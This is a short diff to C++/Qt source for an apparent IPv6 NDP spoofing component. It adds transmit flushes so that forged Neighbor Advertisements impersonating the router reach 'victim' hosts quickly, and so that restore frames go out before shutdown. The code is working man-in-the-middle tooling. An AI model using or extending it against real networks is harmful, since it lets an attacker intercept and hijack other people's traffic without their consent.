@@ -210,12 +210,16 @@ bool NdpSpoofer::answerNeighborSolicit(const QByteArray &frame)
     m_endpoint->send(na);
     m_endpoint->send(na);
     QTimer::singleShot(kAnswerBurstDelay1Ms, this, [this, na, senderMac] {
-        if (m_endpoint && hasVictimMac(senderMac))
+        if (m_endpoint && hasVictimMac(senderMac)) {
             m_endpoint->send(na);
+            m_endpoint->flushTx(); // 同 ArpSpoofer 的抢答补帧，理由见那里
+        }
     });
     QTimer::singleShot(kAnswerBurstDelay2Ms, this, [this, na, senderMac] {
-        if (m_endpoint && hasVictimMac(senderMac))
+        if (m_endpoint && hasVictimMac(senderMac)) {
             m_endpoint->send(na);
+            m_endpoint->flushTx(); // 同 ArpSpoofer 的抢答补帧，理由见那里
+        }
     });
     return true;
 }
@@ -369,6 +373,7 @@ void NdpSpoofer::sendSpoof(const QByteArray &victimMac6)
     const QByteArray na = buildNa(victimMac6, m_localMac, m_routerLL, allNodes(), m_routerLL,
                                   m_localMac, kNaRouter | kNaOverride);
     m_endpoint->send(na);
+    m_endpoint->flushTx(); // 由 1s tick / 50ms boost 两个定时器回调驱动，不在收帧排空路径上
 }
 
 void NdpSpoofer::healOne(const QByteArray &victimMac6)
@@ -394,6 +399,9 @@ void NdpSpoofer::healOne(const QByteArray &victimMac6)
                       kNaRouter | kNaOverride);
     for (int i = 0; i < kHealRepeat; ++i)
         m_endpoint->send(na);
+    // ★ 还原帧必须立刻出网卡（同 ArpSpoofer::healOne）：这条路径跑在撤劫持/退出/睡眠上，
+    //   攒在批量队列里等下一个 flushTx 点是赌运气 —— 端点随后就可能被 close()/析构。
+    m_endpoint->flushTx();
 }
 
 bool NdpSpoofer::hasVictimMac(const QByteArray &mac6) const
